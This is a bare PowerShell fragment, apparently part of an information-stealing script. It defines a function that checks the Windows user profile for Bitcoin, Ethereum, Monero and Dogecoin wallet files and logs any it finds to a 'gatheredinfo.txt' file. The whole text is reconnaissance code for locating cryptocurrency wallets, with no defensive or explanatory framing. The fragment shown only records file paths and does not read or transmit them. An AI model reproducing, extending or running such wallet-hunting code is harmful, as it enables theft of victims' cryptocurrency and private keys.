$gatheredInfo= "gatheredinfo.txt"
function  searchforWallets{
    $walletpath = @("$env:USERPROFILE\.bitcoin\wallet.dat", "$env:USERPROFILE\.ethereum\keystore\*",
    "$env:USERPROFILE\.monero\wallet", "$env:USERPROFILE\.dogecoin\wallet.dat")

    Add-Content -Path $gatheredInfo -Value "`n### Wallet files ###"
    foreach($path in $walletpath){
        if(Test-Path $path){
            Add-Content -Path $gatheredInfo -Value "Found wallet: $path"
        }
    }
}
